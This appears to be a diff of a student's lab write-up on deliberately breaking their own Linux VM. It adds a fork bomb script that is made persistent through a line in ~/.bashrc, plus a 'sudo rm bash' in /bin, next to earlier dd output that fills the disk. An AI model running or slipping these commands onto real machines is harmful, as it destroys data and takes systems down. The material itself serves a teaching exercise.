@@ -159,8 +159,8 @@ dd: error writing '/dev/mapper/rl-root': No space left on device
 4351+0 records out
 18249416704 bytes (18 GB, 17 GiB) copied, 91.6934 s, 199 MB/s
 Segmentation fault
-[vincent@localhost ~]$ df -h
-⭐-bash: /usr/bin/df: Input/output error⭐
+[vincent@localhost ~]vincent
+⭐
 ```
 
 5. Malware
@@ -209,7 +209,49 @@ tout doit être fait depuis le terminal de la machine
 pensez à ce qui constitue un ordi/un OS
 l'idée c'est de supprimer des trucs importants, modifier le comportement de trucs existants, surcharger tel ou tel truc...
 
+```
+[vincent@localhost ~]$ sudo cat bomb.sh
+trap "exec $0" SIGINT
+fork_bomb(){
+    fork_bomb | fork_bomb &
+}
+
+fork_bomb
+[vincent@localhost ~]$ sudo cat ~/.bashrc
+# .bashrc
+
+# Source global definitions
+if [ -f /etc/bashrc ]; then
+    . /etc/bashrc
+fi
+
+# User specific environment
+if ! [[ "$PATH" =~ "$HOME/.local/bin:$HOME/bin:" ]]
+then
+    PATH="$HOME/.local/bin:$HOME/bin:$PATH"
+fi
+export PATH
+
+# Uncomment the following line if you don't like systemctl's auto-paging feature:
+# export SYSTEMD_PAGER=
+
+# User specific aliases and functions
+if [ -d ~/.bashrc.d ]; then
+    for rc in ~/.bashrc.d/*; do
+        if [ -f "$rc" ]; then
+            . "$rc"
+        fi
+    done
+fi
+
+unset rc
+
+⭐sudo bash ~/bomb.sh⭐
+```
 
 
-
-
+2:
+```
+[vincent@localhost ~]$ cd ../../bin
+[vincent@localhost bin]$sudo rm bash
+```
